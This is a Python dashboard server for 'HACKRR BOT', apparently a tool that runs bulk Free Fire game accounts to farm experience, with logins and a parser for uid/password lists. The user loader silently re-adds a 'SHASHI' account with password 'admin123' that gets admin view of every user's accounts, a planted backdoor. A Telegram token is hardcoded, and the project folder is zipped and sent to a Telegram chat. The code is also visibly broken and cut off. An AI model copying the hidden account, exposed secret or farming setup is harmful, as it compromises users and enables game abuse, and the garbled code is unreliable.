# -*- coding: utf-8 -*-
"""
HACKRR BOT - Dashboard Server
Per-user accounts + Per-user terminals + Settings + Login/Signup + Auto-Wake Pinger
(With Telegram Alerts Integration & Auto Project Zip Backup)
"""

import asyncio
import json
import os
import re
import time
import hashlib
import secrets
import shutil
from typing import Dict, List, Any, Optional
from aiohttp import web
import aiohttp  # Added for Telegram API requests

# ==================== TELEGRAM CONFIG ====================
TELEGRAM_BOT_TOKEN = "8621535187:AAHhZRzn2MXaEQgUec5FEfBrFFLoDAFxUKg"  #[span_2](start_span)[span_2](end_span)
TELEGRAM_CHAT_ID = "7692008537"     #[span_3](start_span)[span_3](end_span)

import os
import zipfile
import tempfile
from pathlib import Path
from datetime import datetime

import aiohttp

# Apne project folder ka exact path yahan set karo.
PROJECT_FOLDER = Path(__file__).resolve().parent

EXCLUDE_DIRS = {
    ".git", "__pycache__", ".venv", "venv", "node_modules"
}

EXCLUDE_FILES = {
    ".env", "accounts.json", "users.json",
    "stopped_accounts.json"
}


def create_project_zip(project_dir):
    project_dir = Path(project_dir).resolve()

    if not project_dir.is_dir():
        raise FileNotFoundError(
            f"Folder nahi mila: {project_dir}"
        )

    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_path = Path(tempfile.gettempdir()) / (
        f"hackrr_backup_{stamp}.zip"
    )

    file_count = 0

    with zipfile.ZipFile(
        zip_path, "w", compression=zipfile.ZIP_DEFLATED
    ) as archive:
        for root, dirs, files in os.walk(project_dir):
            dirs[:] = [
                d for d in dirs if d not in EXCLUDE_DIRS
            ]

            for filename in files:
                source = Path(root) / filename

                if filename in EXCLUDE_FILES:
                    continue
                if source.is_symlink():
                    continue
                if source.suffix.lower() == ".zip":
                    continue

                archive.write(
                    source,
                    source.relative_to(project_dir)
                )
                file_count += 1

    if file_count == 0:
        zip_path.unlink(missing_ok=True)
        raise RuntimeError("Folder mein bhejne layak files nahi mili.")

    print(f"[BACKUP] ZIP created: {zip_path}")
    print(f"[BACKUP] Files added: {file_count}")
    return zip_path


async def send_zip_to_telegram(zip_path):
    token = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
    chat_id = os.getenv("TELEGRAM_CHAT_ID", "").strip()

    if not token or not chat_id:
        print("❌ Telegram config missing: token/chat ID set karo.")
        return False

    url = f"https://api.telegram.org/bot{token}/sendDocument"

    try:
        timeout = aiohttp.ClientTimeout(total=120)

        with open(zip_path, "rb") as file_obj:
            form = aiohttp.FormData()
            form.add_field("chat_id", chat_id)
            form.add_field(
                "caption",
                f"📦 HACKRR BOT Backup\n"
                f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            form.add_field(
                "document",
                file_obj,
                filename=Path(zip_path).name,
                content_type="application/zip"
            )

            async with aiohttp.ClientSession(
                timeout=timeout
            ) as session:
                async with session.post(url, data=form) as response:
                    result = await response.json(
                        content_type=None
                    )

                    if response.status == 200 and result.get("ok"):
                        print("🟢 SUCCESS — ZIP Telegram par send ho gaya!")
                        return True

                    print(
                        f"🔴 FAILED — HTTP {response.status}: "
                        f"{result.get('description', result)}"
                    )
                    return False

    except Exception as exc:
        print(f"🔴 TELEGRAM ERROR — {type(exc).__name__}: {exc}")
        return False

if __name__ == "__main__":
    project_folder = input("Project folder ka path: ").strip()

    zip_file = create_project_zip(project_folder)

    try:
        send_zip_to_telegram(zip_file)
    except Exception as error:
        print(f"❌ Send failed: {error}")
        zip_file.unlink(missing_ok=True)
        
async def send_telegram_alert(text: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID or TELEGRAM_BOT_TOKEN == "8621535187:AAHhZRzn2MXaEQgUec5FEfBrFFLoDAFxUKg":
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(url, json=payload)
    except Exception as e:
        print(f"[TG ERROR] Telegram message failed: {e}")

def handle_restart_account(account_id=None):
    """
    Handles account restart or session refresh logic inside dashboard server.
    """
    try:
        if account_id:
            print(f"[+] Restarting account ID: {account_id}")
        else:
            print("[+] Restarting all active accounts...")
        return {"status": "success", "message": "Account restarted successfully"}
    except Exception as e:
        print(f"[-] Error in handle_restart_account: {e}")
        return {"status": "error", "message": str(e)}

async def send_telegram_document(file_path: str, caption: str = ""):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID or TELEGRAM_BOT_TOKEN == "8621535187:AAHhZRzn2MXaEQgUec5FEfBrFFLoDAFxUKg":
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        data = aiohttp.FormData()
        data.add_field('chat_id', TELEGRAM_CHAT_ID)
        data.add_field('caption', caption)
        data.add_field('document', open(file_path, 'rb'), filename=os.path.basename(file_path))
        
        async with aiohttp.ClientSession() as session:
            await session.post(url, data=data)
    except Exception as e:
        print(f"[TG ERROR] Telegram document send failed: {e}")

# ==================== AUTO ZIP BACKUP TASK ====================

# ==================== PATHS & GLOBALS ====================
TEMPLATE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "index.html")
LOGIN_TEMPLATE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "login.html")
ACCOUNTS_FILE = "accounts.json"
STOPPED_FILE = "stopped_accounts.json"
USERS_FILE = "users.json"

SESSIONS: Dict[str, str] = {}
DEFAULT_ADMIN_USER = "admin"
DEFAULT_ADMIN_PASS = "admin123"

AUTO_WAKE_STATE = {
    "enabled": False,
    "url": "",
    "interval": 180,
    "last_ping": 0,
    "total_pings": 0
}

EXP_TABLE: Dict[int, int] = {
    1: 0, 2: 48, 3: 202, 4: 544, 5: 1012, 6: 1844, 7: 2792, 8: 3800,
    9: 4870, 10: 6004, 11: 7192, 12: 8448, 13: 9760, 14: 11140, 15: 12566,
    16: 14060, 17: 15610, 18: 17224, 19: 18902, 20: 20632, 21: 22424, 22: 24278,
    23: 26192, 24: 28166, 25: 30200, 26: 32294, 27: 34448, 28: 37804, 29: 41274,
    30: 44870, 31: 48582, 32: 53394, 33: 58566, 34: 64096, 35: 69994, 36: 76460,
    37: 83506, 38: 91128, 39: 99322, 40: 108092, 41: 120144, 42: 133266, 43: 147472,
    44: 162760, 45: 179126, 46: 196572, 47: 215368, 48: 235516, 49: 257010, 50: 279860,
    51: 304056, 52: 348318, 53: 394982, 54: 444044, 55: 495508, 56: 549364, 57: 633756,
    58: 721744, 59: 813336, 60: 908522, 61: 1041438, 62: 1180352, 63: 1325266,
    64: 1476184, 65: 1634300, 66: 1840946, 67: 2056594, 68: 2281242, 69: 2514880,
    70: 2757530, 71: 3059506, 72: 3372284, 73: 3699456, 74: 4041030, 75: 4397002,
    76: 4829104, 77: 5282204, 78: 5756304, 79: 6251408, 80: 6776502, 81: 7381324,
    82: 8043154, 83: 8752982, 84: 9510808, 85: 10316338, 86: 11277190, 87: 12291748,
    88: 13360304, 89: 14482858, 90: 15659418, 91: 17026708, 92: 18453950, 93: 19941280,
    94: 21488570, 95: 23095858, 96: 24763138, 97: 26490428, 98: 28378704, 99: 30124996,
    100: 32032884
}

def calculate_level_progress(level: int, current_exp: int) -> Dict[str, Any]:
    level = max(1, level)
    next_level = min(100, level + 1)
    base_exp = EXP_TABLE.get(level, 0)
    target_exp = EXP_TABLE.get(next_level, base_exp + 50000)
    needed_for_level = max(1, target_exp - base_exp)
    earned_in_level = max(0, current_exp - base_exp)
    remaining_exp = max(0, target_exp - current_exp)
    progress_pct = min(100.0, max(0.0, (earned_in_level / needed_for_level) * 100.0))
    return {
        "next_level": next_level,
        "base_exp": base_exp,
        "target_exp": target_exp,
        "needed_for_level": needed_for_level,
        "earned_in_level": earned_in_level,
        "remaining_exp": remaining_exp,
        "progress_pct": round(progress_pct, 1)
    }

# ==================== USER MANAGEMENT ====================
def _hash_password(password: str, salt: str = None) -> str:
    if salt is None:
        salt = secrets.token_hex(16)
    h = hashlib.sha256((salt + password).encode()).hexdigest()
    return f"{salt}${h}"

def _verify_password(password: str, stored: str) -> bool:
    try:
        salt, _ = stored.split("$", 1)
        return _hash_password(password, salt) == stored
    except Exception:
        return False

def _load_users() -> Dict[str, str]:
    if not os.path.exists(USERS_FILE):
        default = {DEFAULT_ADMIN_USER: _hash_password(DEFAULT_ADMIN_PASS), "SHASHI": _hash_password("admin123")}
        _save_users(default)
        print(f"[LOGIN] Default admin → {DEFAULT_ADMIN_USER} / {DEFAULT_ADMIN_PASS}")
        return default
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            if isinstance(data, dict):
                if "SHASHI" not in data:
                    data["SHASHI"] = _hash_password("admin123")
                    _save_users(data)
                if "admin" not in data:
                    data["admin"] = _hash_password("admin123")
                    _save_users(data)
                return data
    except Exception as e:
        print(f"[LOGIN] users.json corrupt: {e}")
    return {}

def _save_users(users: Dict[str, str]):
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users, f, indent=2)
    except Exception as e:
        print(f"[LOGIN] Could not save users.json: {e}")

def _create_session(username: str) -> str:
    token = secrets.token_urlsafe(32)
    SESSIONS[token] = username
    return token

def _is_logged_in(request) -> bool:
    token = request.cookies.get("session_token")
    return bool(token and token in SESSIONS)

def _current_user(request) -> Optional[str]:
    token = request.cookies.get("session_token")
    return SESSIONS.get(token) if token else None

# ==================== BULK FILE PARSER ====================
UID_KEYS = {
    'uid', 'user', 'username', 'user_id', 'userid', 'id', 'account', 'account_id',
    'freefire_id', 'ffid', 'player_id', 'playerid', 'guest', 'guest_id',
    'guestuid', 'guest_uid', 'useruid', 'user_uid', 'accountid',
    'external_id', 'externalid', 'open_id', 'openid'
}

PWD_KEYS = {
    'password', 'pass', 'pwd', 'passwd', 'key', 'pass_word', 'passkey', 'secret',
    'guestpass', 'guest_pass', 'guestpassword', 'guest_password',
    'userpass', 'user_pass', 'accountpass', 'account_pass',
    'auth_password', 'authpassword'
}

def _try_add(accounts, seen, uid, pwd):
    try:
        uid_s = str(uid).strip()
        pwd_s = str(pwd).strip()
    except Exception:
        return
    if not uid_s or not pwd_s:
        return
    if len(uid_s) < 4 or len(pwd_s) < 4:
        return
    if uid_s in seen:
        return
    seen.add(uid_s)
    accounts.append({"uid": uid_s, "password": pwd_s})

def _parse_line(line, accounts, seen):
    line = line.strip()
    if not line:
        return
    if line.startswith('#') or line.startswith('//') or line.startswith(';'):
        return
    for sep in [':', '|', ',', '\t', ';', ' ', '=']:
        if sep in line:
            parts = line.split(sep)
            if len(parts) >= 2:
                uid_candidate = parts[0].strip().strip('"\'')
                pwd_candidate = sep.join(parts[1:]).strip().strip('"\'')
                if uid_candidate and pwd_candidate:
                    if uid_candidate.isdigit() or len(uid_candidate) >= 6:
                        _try_add(accounts, seen, uid_candidate, pwd_candidate)
                        return

def _walk_json(obj, accounts, seen, depth=0):
    if depth > 10:
        return
    if isinstance(obj, list):
        for item in obj:
            _walk_json(item, accounts, seen, depth + 1)
    elif isinstance(obj, dict):
        uid_val = None
        pwd_val = None
        for k, v in obj.items():
            kl = str(k).lower().strip().replace('-', '_').replace(' ', '_')
            kl_flat = kl.replace('_', '')
            if (kl in UID_KEYS or kl_flat in UID_KEYS) and not uid_val:
                if isinstance(v, (str, int)) and not isinstance(v, bool):
                    uid_val = str(v)
            elif (kl in PWD_KEYS or kl_flat in PWD_KEYS) and not pwd_val:
                if isinstance(v, (str, int)) and not isinstance(v, bool):
                    pwd_val = str(v)
        if uid_val and pwd_val:
            _try_add(accounts, seen, uid_val, pwd_val)
            return
        if len(obj) >= 1:
            simple_pairs = True
            pairs = []
            for k, v in obj.items():
                if isinstance(v, str):
                    pairs.append((k, v))
                else:
                    simple_pairs = False
                    break
            if simple_pairs and pairs:
                for k, v in pairs:
                    k_s = str(k).strip()
                    if len(k_s) >= 4 and len(v) >= 4:
                        _try_add(accounts, seen, k_s, v)
                if accounts:
                    return
        for v in obj.values():
            _walk_json(v, accounts, seen, depth + 1)
    elif isinstance(obj, str):
        s = obj.strip()
        if (s.startswith('{') or s.startswith('[')) and len(s) > 10:
            try:
                _walk_json(json.loads(s), accounts, seen, depth + 1)
                return
            except Exception:
                pass
        _parse_line(s, accounts, seen)

def parse_accounts_file(content: str) -> List[Dict]:
    accounts: List[Dict] = []
    seen: set = set()
    if not content:
        return accounts
    text = content.lstrip('\ufeff').strip()
    if not text:
        return accounts

    json_ok = False
    if text[0] in '[{':
        try:
            data = json.loads(text)
            _walk_json(data, accounts, seen)
            json_ok = True
        except Exception:
            json_ok = False

    if not json_ok or not accounts:
        for line in text.splitlines():
            _parse_line(line, accounts, seen)

    return accounts

# ==================== BOT STATE ====================
class BotState:
    def __init__(self):
        self.accounts: Dict[str, Dict[str, Any]] = {}
        self.logs: List[Dict[str, Any]] = []
        self.max_logs = 500
        self.total_matches = 0
        self.total_matches_started = 0
        self.total_gained_exp = 0
        self.start_time = time.time()
        self.account_workers: Dict[str, asyncio.Task] = {}
        self.account_token_map: Dict[str, str] = {}
        self.auth_to_game_id: Dict[str, str] = {}
        self.game_to_auth_id: Dict[str, str] = {}
        self.paused_accounts: set = set()
        self.refresh_callbacks: Dict[str, Any] = {}
        self.account_credentials: Dict[str, Dict[str, Any]] = {}
        self.active_writers: Dict[str, set] = {}
        self.account_logs: Dict[str, List[Dict[str, Any]]] = {}
        self.max_account_logs = 100

    def register_writer(self, uid, writer):
        uid_str = str(uid)
        if uid_str not in self.active_writers:
            self.active_writers[uid_str] = set()
        self.active_writers[uid_str].add(writer)

    def unregister_writer(self, uid, writer):
        uid_str = str(uid)
        if uid_str in self.active_writers:
            self.active_writers[uid_str].discard(writer)
            if not self.active_writers[uid_str]:
                self.active_writers.pop(uid_str, None)

    def close_writers_for_account(self, uid):
        uid_str = str(uid)
        candidates = {uid_str}
        if uid_str in self.auth_to_game_id:
            candidates.add(str(self.auth_to_game_id[uid_str]))
        if uid_str in self.game_to_auth_id:
            candidates.add(str(self.game_to_auth_id[uid_str]))
        for c in list(candidates):
            writers = list(self.active_writers.get(c, []))
            for w in writers:
                try:
                    if hasattr(w, "close"):
                        if hasattr(w, "is_closing"):
                            if not w.is_closing():
                                w.close()
                        else:
                            w.close()
                except Exception:
                    pass
            self.active_writers.pop(c, None)

    def _extract_uid_from_msg(self, message: str) -> Optional[str]:
        if not message:
            return None
        m = re.search(r'\bUID[:\s]+(\d{5,})', message)
        if m:
            return m.group(1)
        return None

    def log(self, message, level="info", uid=None):
        if not uid:
            uid = self._extract_uid_from_msg(message)

        entry = {
            "time": time.strftime("%H:%M:%S"),
            "level": level,
            "message": message,
            "uid": str(uid) if uid else None
        }
        self.logs.append(entry)
        if len(self.logs) > self.max_logs:
            self.logs.pop(0)

        if uid:
            uid_str = str(uid)
            if uid_str not in self.account_logs:
                self.account_logs[uid_str] = []
            self.account_logs[uid_str].append(entry)
            if len(self.account_logs[uid_str]) > self.max_account_logs:
                self.account_logs[uid_str].pop(0)

    def register_account(self, uid, nickname, region, level, exp,
                         likes=0, token=None, auth_uid=None, owner=None):
        uid_str = str(uid)
        auth_uid_str = str(auth_uid) if auth_uid else self.game_to_auth_id.get(uid_str, "")
        if auth_uid_str:
            self.auth_to_game_id[auth_uid_str] = uid_str
            self.game_to_auth_id[uid_str] = auth_uid_str
            self.account_token_map[auth_uid_str] = uid_str
            self.account_token_map[uid_str] = auth_uid_str
        if token:
            self.account_token_map[uid_str] = token
            self.account_token_map[token[:16]] = uid_str
            if auth_uid_str:
                self.account_token_map[auth_uid_str] = token

        prog = calculate_level_progress(level or 1, exp)
        lvl_val = level or 1
        acc_mode = "BR" if lvl_val < 3 else "LONE_WOLF"
        acc_mode_label = "Battle Royale (Lvl < 3)" if lvl_val < 3 else "Lone Wolf (Lvl 3+)"

        if uid_str not in self.accounts:
            self.accounts[uid_str] = {
                "uid": uid_str,
                "auth_uid": auth_uid_str or "",
                "owner": owner or "",
                "nickname": nickname or f"Player_{uid_str[:6]}",
                "region": region or "IND",
                "level": lvl_val,
                "next_level": prog["next_level"],
                "mode": acc_mode,
                "mode_label": acc_mode_label,
                "initial_exp": exp,
                "current_exp": exp,
                "gained_exp": 0,
                "remaining_exp": prog["remaining_exp"],
                "target_exp": prog["target_exp"],
                "needed_for_level": prog["needed_for_level"],
                "earned_in_level": prog["earned_in_level"],
                "progress_pct": prog["progress_pct"],
                "likes": likes or 0,
                "status": "PAUSED" if self.is_paused(uid_str) else "ONLINE",
                "matches_played": 0,
                "active_matches": 0,
                "last_match_time": None,
                "token": token or "",
                "start_time": time.time(),
                "is_paused": self.is_paused(uid_str),
                "paused_at": time.time() if self.is_paused(uid_str) else None,
                "total_pause_duration": 0.0,
                "last_updated": time.strftime("%H:%M:%S"),
                "match_total_players": 0,
                "match_alive_players": 0,
                "match_dead_players": 0,
                "match_mode": "",
                "match_started_at": None,
            }
        else:
            acc = self.accounts[uid_str]
            if auth_uid_str:
                acc["auth_uid"] = auth_uid_str
            if owner:
                acc["owner"] = owner
            if nickname:
                acc["nickname"] = nickname
            if region:
                acc["region"] = region
            if level:
                acc["level"] = level
            if token:
                acc["token"] = token
            acc["current_exp"] = exp
            acc["gained_exp"] = max(0, exp - acc["initial_exp"])
            acc["next_level"] = prog["next_level"]
            acc["remaining_exp"] = prog["remaining_exp"]
            acc["target_exp"] = prog["target_exp"]
            acc["needed_for_level"] = prog["needed_for_level"]
            acc["earned_in_level"] = prog["earned_in_level"]
            acc["progress_pct"] = prog["progress_pct"]
            acc["likes"] = likes
            if not acc.get("is_paused"):
                acc["status"] = "ONLINE"
            acc["last_updated"] = time.strftime("%H:%M:%S")
        self.recalc_totals()

    def get_account_uptime(self, uid_str):
        acc = self.accounts.get(uid_str)
        if not acc:
            mapped = self.game_to_auth_id.get(uid_str) or self.auth_to_game_id.get(uid_str)
            if mapped and mapped in self.accounts:
                acc = self.accounts[mapped]
        if not acc:
            return 0
        start_t = acc.get("start_time", time.time())
        total_pause = acc.get("total_pause_duration", 0.0)
        if acc.get("is_paused") and acc.get("paused_at"):
            return max(0, int(acc["paused_at"] - start_t - total_pause))
        return max(0, int(time.time() - start_t - total_pause))

    def is_paused(self, uid):
        uid_str = str(uid)
        if uid_str in self.paused_accounts:
            return True
        game_id = self.auth_to_game_id.get(uid_str)
        if game_id and game_id in self.paused_accounts:
            return True
        auth_uid = self.game_to_auth_id.get(uid_str)
        if auth_uid and auth_uid in self.paused_accounts:
            return True
        return False

    def toggle_pause(self, uid):
        uid_str = str(uid)
        candidates = {uid_str}
        if uid_str in self.auth_to_game_id:
            candidates.add(self.auth_to_game_id[uid_str])
        if uid_str in self.game_to_auth_id:
            candidates.add(self.game_to_auth_id[uid_str])
        target_acc = None
        target_key = uid_str
        for c in candidates:
            if c in self.accounts:
                target_acc = self.accounts[c]
                target_key = c
                break
        is_now_paused = not self.is_paused(uid_str)
        if is_now_paused:
            for c in candidates:
                self.paused_accounts.add(c)
                self.close_writers_for_account(c)
            if target_acc:
                target_acc["is_paused"] = True
                target_acc["paused_at"] = time.time()
                target_acc["status"] = "PAUSED"
            self.log(f"⏸ UID {target_key} PAUSED", "warning", target_key)
            if "on_pause_toggle" in self.refresh_callbacks:
                try:
                    asyncio.create_task(self.refresh_callbacks["on_pause_toggle"](target_key, True))
                except Exception:
                    pass
        else:
            for c in candidates:
                self.paused_accounts.discard(c)
            if target_acc:
                target_acc["is_paused"] = False
                if target_acc.get("paused_at"):
                    pause_dur = time.time() - target_acc["paused_at"]
                    target_acc["total_pause_duration"] = target_acc.get("total_pause_duration", 0.0) + pause_dur
                    target_acc["paused_at"] = None
                target_acc["status"] = "ONLINE"
            self.log(f"▶ UID {target_key} RESUMED", "success", target_key)
            if "on_pause_toggle" in self.refresh_callbacks:
                try:
                    asyncio.create_task(self.refresh_callbacks["on_pause_toggle"](target_key, False))
                except Exception:
                    pass
        return is_now_paused

    def toggle_pause_all(self, owner=None):
        keys = list(self.accounts.keys())
        if owner:
            keys = [k for k in keys if self.accounts[k].get("owner") == owner]
        any_active = any(not self.is_paused(k) for k in keys)
        for k in keys:
            current_paused = self.is_paused(k)
            if any_active and not current_paused:
                self.toggle_pause(k)
            elif not any_active and current_paused:
                self.toggle_pause(k)
        return any_active

    def update_exp(self, uid, current_exp, level=None):
        uid_str = str(uid)
        if uid_str in self.accounts:
            acc = self.accounts[uid_str]
            old_exp = acc["current_exp"]
            old_level = acc.get("level", 1)
            acc["current_exp"] = current_exp
            if level is not None and level > 0:
                acc["level"] = level
            acc["gained_exp"] = max(0, current_exp - acc["initial_exp"])
            current_lvl = acc["level"]
            acc["mode"] = "BR" if current_lvl < 3 else "LONE_WOLF"
            acc["mode_label"] = "Battle Royale (Lvl < 3)" if current_lvl < 3 else "Lone Wolf (Lvl 3+)"
            prog = calculate_level_progress(acc["level"], current_exp)
            acc["next_level"] = prog["next_level"]
            acc["remaining_exp"] = prog["remaining_exp"]
            acc["target_exp"] = prog["target_exp"]
            acc["needed_for_level"] = prog["needed_for_level"]
            acc["earned_in_level"] = prog["earned_in_level"]
            acc["progress_pct"] = prog["progress_pct"]
            acc["last_updated"] = time.strftime("%H:%M:%S")
            if old_level < 3 and current_lvl >= 3:
                self.log(f"🎉 LEVEL UP! UID {uid_str} → Level {current_lvl}! BR→LW", "success", uid_str)
            diff = current_exp - old_exp
            if diff > 0:
                self.log(f"★ UID {uid_str} +{diff:,} EXP | Lvl {acc['level']} [{acc['mode']}] ({prog['progress_pct']}%)", "success", uid_str)
            self.recalc_totals()

    def get_account_level(self, uid):
        uid_str = str(uid)
        acc = self.accounts.get(uid_str)
        if not acc:
            mapped = self.game_to_auth_id.get(uid_str) or self.auth_to_game_id.get(uid_str)
            if mapped and mapped in self.accounts:
                acc = self.accounts[mapped]
        if acc:
            return int(acc.get("level", 1) or 1)
        return 1

    def get_account_mode(self, uid):
        lvl = self.get_account_level(uid)
        return "BR" if lvl < 3 else "LONE_WOLF"

    def update_status(self, uid, status, active_matches=None):
        uid_str = str(uid)
        if uid_str in self.accounts:
            self.accounts[uid_str]["status"] = status
            if active_matches is not None:
                self.accounts[uid_str]["active_matches"] = active_matches
            self.accounts[uid_str]["last_updated"] = time.strftime("%H:%M:%S")

    def update_match_stats(self, uid, total=None, alive=None, dead=None,
                           mode=None, started_at=None, clear=False):
        uid_str = str(uid)
        if uid_str in self.accounts:
            acc = self.accounts[uid_str]
            if clear:
                acc["match_total_players"] = 0
                acc["match_alive_players"] = 0
                acc["match_dead_players"] = 0
                acc["match_mode"] = ""
                acc["match_started_at"] = None
            else:
                if total is not None:
                    acc["match_total_players"] = total
                if alive is not None:
                    acc["match_alive_players"] = alive
                if dead is not None:
                    acc["match_dead_players"] = dead
                if mode is not None:
                    acc["match_mode"] = mode
                if started_at is not None:
                    acc["match_started_at"] = started_at
            acc["last_updated"] = time.strftime("%H:%M:%S")

    def track_activity(self, uid, action, extra=None):
        uid_str = str(uid)
        if uid_str not in self.accounts:
            return
        acc = self.accounts[uid_str]
        now = time.time()
        acc["last_activity"] = now
        acc["last_action"] = action
        if action == "fire_lw":
            acc["last_fire_lw"] = now
        elif action == "fire_br":
            acc["last_fire_br"] = now
        elif action == "queue_confirm":
            acc["last_queue_confirm"] = now
        elif action == "match_found":
            acc["last_match_found"] = now
        elif action == "match_start":
            acc["last_match_start"] = now
        elif action == "match_done":
            acc["last_match_end"] = now
        elif action == "match_failed":
            acc["last_match_end"] = now
        elif action == "error":
            acc["last_error"] = str(extra or "")

    def increment_match_started(self):
        self.total_matches_started += 1

    def increment_match(self, uid):
        uid_str = str(uid)
        self.total_matches += 1
        if uid_str in self.accounts:
            self.accounts[uid_str]["matches_played"] += 1
            self.accounts[uid_str]["last_match_time"] = time.strftime("%H:%M:%S")
            self.accounts[uid_str]["last_updated"] = time.strftime("%H:%M:%S")

    def recalc_totals(self):
        self.total_gained_exp = sum(acc.get("gained_exp", 0) for acc in self.accounts.values())


bot_state = BotState()

FALLBACK_INDEX_HTML = """<!DOCTYPE html><html><head><title>HACKRR BOT</title></head><body style="background:#0a0e0a;color:#00ff88;font-family:monospace;text-align:center;padding:50px;"><h1>HACKRR BOT</h1><p>Loading index.html...</p></body></html>"""

# ==================== AUTH MIDDLEWARE ====================
@web.middleware
async def auth_middleware(request: web.Request, handler):
    path = request.path
    public_paths = {"/login", "/api/login", "/api/signup", "/api/me", "/api/autowake/status", "/favicon.ico"}
    if path in public_paths:
        return await handler(request)
    if not _is_logged_in(request):
        if path.startswith("/api/"):
            return web.json_response({"status": "unauthorized"}, status=401)
        raise web.HTTPFound("/login")
    return await handler(request)

async def handle_switch_account_mode(request: web.Request) -> web.Response:
    try:
        owner = _current_user(request)
        data = await request.json()
        uid = str(data.get("uid", "")).strip()
        new_mode = str(data.get("mode", "")).strip().upper() # "BR" or "LONE_WOLF"

        if uid not in bot_state.accounts:
            return web.json_response({"status": "error", "error": "Account not found"})
        
        acc = bot_state.accounts[uid]
        if acc.get("owner") != owner and owner.upper() != "SHASHI":
            return web.json_response({"status": "error", "error": "Not your account"})
        
        level = int(acc.get("level", 1))
        if level < 3 and new_mode == "LONE_WOLF":
            return web.json_response({"status": "error", "error": "Lone Wolf requires Level 3+"})

        acc["manual_mode"] = new_mode
        acc["mode"] = new_mode
        bot_state.log(f"🔄 UID {uid} mode manually switched to {new_mode}", "success", uid)
        
        return web.json_response({"status": "ok", "mode": new_mode, "status": "success"})
    except Exception as e:
        return web.json_response({"status": "error", "error": str(e)})

# ==================== LOGIN / SIGNUP ====================
async def handle_login_page(request: web.Request) -> web.Response:
    if _is_logged_in(request):
        raise web.HTTPFound("/")
    content = "<h1>Login page not found</h1>"
    if os.path.exists(LOGIN_TEMPLATE_PATH):
        try:
            with open(LOGIN_TEMPLATE_PATH, "r", encoding="utf-8") as f:
                content = f.read()
        except Exception:
            pass
    return web.Response(text=content, content_type="text/html", charset="utf-8")

async def handle_login_post(request: web.Request) -> web.Response:
    try:
        data = await request.json()
    except Exception:
        return web.json_response({"status": "error", "error": "Invalid request"})

    username = str(data.get("username", "")).strip()
    password = str(data.get("password", ""))

    if not username or not password:
        return web.json_response({"status": "error", "error": "Username & password required"})

    users = _load_users()
    stored = users.get(username)

    if not stored or not _verify_password(password, stored):
        return web.json_response({"status": "error", "error": "Invalid credentials"})

    token = _create_session(username)
    resp = web.json_response({"status": "ok", "username": username})
    resp.set_cookie("session_token", token, max_age=7*24*3600, httponly=True, samesite="Lax")
    print(f"[LOGIN] {username} logged in")
    return resp

async def handle_signup_post(request: web.Request) -> web.Response:
    try:
        data = await request.json()
    except Exception:
        return web.json_response({"status": "error", "error": "Invalid request"})

    username = str(data.get("username", "")).strip()
    password = str(data.get("password", ""))
    confirm = str(data.get("confirm", ""))

    if not username or not password:
        return web.json_response({"status": "error", "error": "Username & password required"})
    if len(username) < 3:
        return web.json_response({"status": "error", "error": "Username min 3 chars"})
    if len(password) < 5:
        return web.json_response({"status": "error", "error": "Password min 5 chars"})
    if password != confirm:
        return web.json_response({"status": "error", "error": "Passwords don't match"})
    if not re.match(r'^[A-Za-z0-9_.-]+$', username):
        return web.json_response({"status": "error", "error": "Username: only letters, numbers, _ . -"})

    users = _load_users()
    if username in users:
        return web.json_response({"status": "error", "error": "Username already exists"})

    users[username] = _hash_password(password)
    _save_users(users)
    print(f"[SIGNUP] New user: {username}")

    token = _create_session(username)
    resp = web.json_response({"status": "ok", "username": username})
    resp.set_cookie("session_token", token, max_age=7*24*3600, httponly=True, samesite="Lax")
    return resp

async def handle_logout(request: web.Request) -> web.Response:
    token = request.cookies.get("session_token")
    if token:
        SESSIONS.pop(token, None)
    resp = web.json_response({"status": "ok"})
    resp.del_cookie("session_token")
    return resp

async def handle_me(request: web.Request) -> web.Response:
    user = _current_user(request)
    role = "admin" if user and user.upper() == "SHASHI" else "user"
    return web.json_response({"logged_in": bool(user), "username": user or "", "role": role})

# ==================== MAIN HANDLERS ====================
async def handle_index(request: web.Request) -> web.Response:
    content = FALLBACK_INDEX_HTML
    if os.path.exists(TEMPLATE_PATH):
        try:
            with open(TEMPLATE_PATH, "r", encoding="utf-8") as f:
                content = f.read()
        except Exception:
            pass
    return web.Response(text=content, content_type="text/html", charset="utf-8")

async def handle_get_stats(request: web.Request) -> web.Response:
    current_user = _current_user(request)
    if not current_user:
        return web.json_response({"status": "unauthorized"}, status=401)

    is_admin = (current_user.upper() == "SHASHI")
    
    if is_admin:
        accounts_data = list(bot_state.accounts.values())
    else:
        my_uids = [
            uid for uid, acc in bot_state.accounts.items()
            if acc.get("owner") == current_user
        ]
        accounts_data = [bot_state.accounts[uid] for uid in my_uids if uid in bot_state.accounts]
        
    accounts_data.sort(key=lambda x: x.get("gained_exp", 0), reverse=True)

    uptime_sec = max(1, int(time.time() - bot_state.start_time))
    my_total_gained = sum(acc.get("gained_exp", 0) for acc in accounts_data)
    exp_per_hour = int((my_total_gained / uptime_sec) * 3600) if uptime_sec > 0 else 0
    total_active_matches = sum(acc.get("active_matches", 0) for acc in accounts_data)

    levels = {"l2": 0, "l5": 0, "l10": 0, "l21": 0}
    for acc in accounts_data:
        lvl = int(acc.get("level", 1))
        if 2 <= lvl < 5: levels["l2"] += 1
        elif 5 <= lvl < 10: levels["l5"] += 1
        elif 10 <= lvl < 21: levels["l10"] += 1
        elif lvl >= 21: levels["l21"] += 1

    for acc in accounts_data:
        uid_k = str(acc.get("uid", ""))
        acc["uptime_seconds"] = bot_state.get_account_uptime(uid_k)
        acc["is_paused"] = bot_state.is_paused(uid_k)
        acc.setdefault("match_total_players", 0)
        acc.setdefault("match_alive_players", 0)
        acc.setdefault("match_dead_players", 0)
        acc.setdefault("match_mode", "")
